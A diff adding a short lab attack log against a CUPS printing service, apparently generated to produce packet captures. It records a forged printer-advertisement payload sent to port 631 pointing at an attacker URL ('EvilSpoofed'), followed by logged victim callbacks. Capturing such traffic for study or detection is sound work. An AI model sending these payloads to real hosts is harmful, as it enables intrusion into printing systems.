@@ -1,0 +1,6 @@
+2026-11-16 21:06:50,394 INFO sniffing 12s for callbacks (filter: dst host 172.26.0.3 and dst port 12345)
+2026-11-16 21:06:50,897 INFO sending variant=spoofed-address advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilSpoofed "Attacker lab" "Forged source"'
+2026-11-16 21:07:02,419 WARNING CALLBACK: victim 172.26.0.4:50482 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:07:02,419 WARNING CALLBACK: victim 172.26.0.4:36562 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:07:02,419 INFO captured 8 packet(s) after sending
+2026-11-16 21:07:02,425 INFO wrote 9 packet(s) to pcap_files/attack-spoofed.pcap
